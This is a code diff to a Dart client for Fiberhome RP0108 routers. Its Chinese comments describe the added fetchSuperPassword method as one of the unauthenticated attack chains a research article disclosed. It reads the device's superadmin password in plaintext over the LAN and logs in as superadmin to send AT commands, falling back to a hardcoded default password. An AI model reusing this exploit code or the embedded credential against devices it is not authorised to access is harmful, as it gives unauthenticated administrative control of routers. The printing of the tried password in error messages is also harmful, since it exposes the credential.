@@ -196,16 +196,76 @@ class FiberhomeClient {
 
   static const String _superAdminPassword = r'F1ber$dm';
 
+  /// 通过 FHNCAPIS（无需认证，AES-CBC 加密）读取设备当前真实的 superadmin 密码。
+  ///
+  /// 研究文章披露的未认证攻击链之一：FHNCAPIS 的 get_refresh_sessionid 与
+  /// get_value_by_xmlnode 完全不需要认证，且 AES key 由公开的 sessionid 派生，
+  /// 因此任何能连上设备局域网的人都能直接读出 superadmin 密码。
+  /// 返回明文密码；读取失败（接口被限制/固件差异）时返回 null。
+  Future<String?> fetchSuperPassword() async {
+    try {
+      final sid = _sessionId.trim().isNotEmpty
+          ? _sessionId.trim()
+          : await refreshSessionId();
+      final innerJson = jsonEncode(<String, Object?>{
+        'dataObj': <String, String>{
+          'InternetGatewayDevice.X_FH_WebUserInfo.2.WebSuperPassword': '',
+        },
+        'ajaxmethod': 'get_value_by_xmlnode',
+        'sessionid': sid,
+      });
+      final encryptedBody = _FiberhomeAes.encrypt(innerJson, sid);
+      final uri = Uri.parse('http://$_normalizedHost/api/tmp/FHNCAPIS');
+      final request = await _http.postUrl(uri).timeout(timeout);
+      request.headers.set(HttpHeaders.contentTypeHeader, 'text/plain');
+      _applyHeaders(request);
+      final payload = utf8.encode(encryptedBody);
+      request.contentLength = payload.length;
+      request.add(payload);
+
+      final response = await request.close().timeout(timeout);
+      final text = await response.transform(utf8.decoder).join();
+      _raiseForStatus(response, text);
+
+      String decrypted;
+      try {
+        decrypted = _FiberhomeAes.decrypt(text, sid);
+      } catch (_) {
+        decrypted = text;
+      }
+      final decoded = _decodeJson(decrypted);
+      final pwd = decoded['WebSuperPassword']?.toString() ??
+          decoded['value']?.toString() ??
+          '';
+      return pwd.isNotEmpty ? pwd : null;
+    } catch (_) {
+      return null;
+    }
+  }
+
   /// 通过 Web 登录接口获取 superadmin 会话。
   /// 返回本次会话的 sessionid，后续 FHAPIS 调用必须使用同一个 sessionid 派生 AES key。
-  Future<String> superLogin() async {
+  ///
+  /// [superPassword] 为可选项：用户手动指定的超密（UI 输入框）。
+  /// 不传时优先从设备读取真实超密（无需认证），读取失败再回退到硬编码默认值。
+  Future<String> superLogin({String? superPassword}) async {
     _sessionId = await refreshSessionId();
+
+    // 解析本次登录要用的密码：手动指定 > 设备读取 > 硬编码默认
+    String pwd;
+    if (superPassword != null && superPassword.trim().isNotEmpty) {
+      pwd = superPassword.trim();
+    } else {
+      final fetched = await fetchSuperPassword();
+      pwd = (fetched != null && fetched.isNotEmpty) ? fetched : _superAdminPassword;
+    }
+
     final innerJson = jsonEncode(<String, Object?>{
       'dataObj': <String, String>{
         // FHAPIS 必须使用 superadmin 账号，忽略外部传入的普通 username
         'username': 'superadmin',
-        // RP0108 固件超管固定密码，不依赖用户输入的 admin 密码
-        'password': _superAdminPassword,
+        // 优先用设备读取到的真实超密；否则用硬编码默认值（RP0108: F1ber$dm）
+        'password': pwd,
       },
       'ajaxmethod': 'DO_WEB_LOGIN',
       'sessionid': _sessionId.trim(),
@@ -244,7 +304,8 @@ class FiberhomeClient {
         decoded = <String, dynamic>{};
       } else if (status.startsWith('0|')) {
         throw StateError(
-            'FHAPIS Web 登录失败（状态码 $status）。请确认设备为烽火 RP0108 且超密为 F1ber\$dm。');
+            'FHAPIS Web 登录失败（状态码 $status）。尝试密码：$pwd。'
+            '若设备已修改超密，请在「AT 命令调试」面板填入正确的 superadmin 密码后重试。');
       } else {
         throw StateError('FHAPIS Web 登录返回非预期响应：$text');
       }
@@ -322,12 +383,13 @@ class FiberhomeClient {
   Future<Map<String, dynamic>> callApis(
     String ajaxMethod, {
     Object? dataObj,
+    String? superPassword,
   }) async {
     // FHAPIS 必须走 superadmin Web 登录，且全程使用同一个 sessionid 派生 AES key。
     // 注意：这里不能再 refreshSessionId()，否则 sessionid 改变会导致 AES key 不匹配，
     // 服务端返回明文 0| 错误而非密文 —— 这正是之前“无法解密”的根因。
     if (_sessionId.trim().isEmpty || !_superLoggedIn) {
-      await superLogin();
+      await superLogin(superPassword: superPassword);
     }
 
     // 构造明文 JSON
@@ -375,10 +437,14 @@ class FiberhomeClient {
   ///   AT+QENG="neighbourcell" — 查询邻区列表
   ///   AT+QCAINFO            — 载波聚合信息
   ///   AT+C5GREG?            — 5G 注册状态
-  Future<Map<String, dynamic>> sendAtCommand(String command) {
+  Future<Map<String, dynamic>> sendAtCommand(
+    String command, {
+    String? superPassword,
+  }) {
     return callApis(
       'set_at_command',
       dataObj: <String, String>{'command': command},
+      superPassword: superPassword,
     );
   }
 
